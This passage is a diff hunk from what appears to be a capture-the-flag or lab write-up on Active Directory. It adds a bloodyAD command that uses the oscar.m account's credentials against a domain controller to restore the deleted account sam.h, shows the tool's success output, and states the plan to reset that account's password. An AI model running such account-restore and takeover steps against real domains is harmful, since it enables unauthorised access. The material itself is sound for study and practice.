@@ -657,3 +657,12 @@ loginShell: WRITE
 
 It looks like oscar can restore the user and he also has full control over the user so i should be able to change his password!
 
+```python
+bloodyAD --host sg-dc01.shadowgate.local -d shadowgate.local -u oscar.m -p 'Password123!' -k set restore 'sam.h'         
+
+[+] sam.h has been restored successfully under CN=sam.h,CN=Users,DC=shadowgate,DC=local
+```
+
+Now the user is restored
+
+``
